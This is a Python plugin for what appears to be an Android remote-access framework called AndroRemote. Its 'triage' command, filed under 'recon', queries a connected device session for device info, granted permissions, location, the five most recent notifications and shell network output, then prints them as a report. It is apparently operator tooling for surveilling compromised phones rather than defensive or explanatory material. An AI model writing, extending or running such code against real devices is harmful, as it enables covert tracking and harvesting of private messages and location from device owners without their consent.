"""Triage plugin: one-shot automated device reconnaissance and posture assessment."""

from typing import List
from rich.table import Table
from rich import box
from rich.markup import escape

from androremote.plugins.base import Plugin, command, PluginContext


class TriagePlugin(Plugin):
    name = "triage"
    version = "1.0.0"
    author = "AndroRemote"
    description = "Automated device reconnaissance and triage assessment"

    @command(
        name="triage",
        usage="/triage [all|info|perms|net|notifs]",
        category="recon",
        description="Run automated device triage & summary",
        details="Gathers device information, permissions, network interfaces, and notifications in one pass.\n\nExamples:\n  /triage\n  /triage perms\n  /triage net",
    )
    def cmd_triage(self, args: List[str], ctx: PluginContext) -> None:
        cid = ctx.active_client
        if not cid:
            ctx.log("!", "no active session — select one with /use", "yellow")
            return

        target_section = args[0].lower() if args else "all"
        tag = ctx.alias_tag(cid)
        console = ctx.console

        with console.status(f"[cyan]Running triage on [bold]{escape(tag)}[/bold]...[/cyan]", spinner="dots"):
            info_res = ctx.send_and_wait("INFO") if target_section in ("all", "info") else None
            perms_res = ctx.send_and_wait("PERMS") if target_section in ("all", "perms") else None
            loc_res = ctx.send_and_wait("LOC") if target_section in ("all", "info") else None
            notifs_res = ctx.send_and_wait("NOTIFS 5") if target_section in ("all", "notifs") else None
            net_res = ctx.send_and_wait("SHELL ip -brief addr") if target_section in ("all", "net") else None

        # Build output presentation
        table = Table(
            title=f"[bold cyan]TRIAGE REPORT[/bold cyan] · [white bold]{escape(tag)}[/white bold]",
            box=box.ROUNDED,
            header_style="bold magenta",
            border_style="cyan",
            expand=True,
        )
        table.add_column("Category", style="bold white", width=16)
        table.add_column("Details", style="dim cyan")

        if info_res:
            lines = [line.strip() for line in info_res.splitlines() if line.strip()]
            clean_info = "\n".join(lines[:8])
            table.add_row("Device Info", clean_info or "[dim]None[/dim]")

        if perms_res:
            clean_perms = perms_res.replace("OK perms: ", "").strip()
            table.add_row("Permissions", clean_perms or "[dim]None[/dim]")

        if loc_res and not loc_res.startswith("ERR"):
            loc_clean = loc_res.replace("OK loc: ", "").strip()
            table.add_row("Location", f"[green]{loc_clean}[/green]")

        if net_res and not net_res.startswith("ERR"):
            net_clean = net_res.replace("OK", "").strip()
            table.add_row("Network", net_clean or "[dim]No interface data[/dim]")

        if notifs_res and not notifs_res.startswith("ERR"):
            notifs_clean = "\n".join(notifs_res.replace("OK", "").strip().splitlines()[-5:])
            table.add_row("Recent Notifs", notifs_clean or "[dim]No recent notifications[/dim]")

        console.print(table)
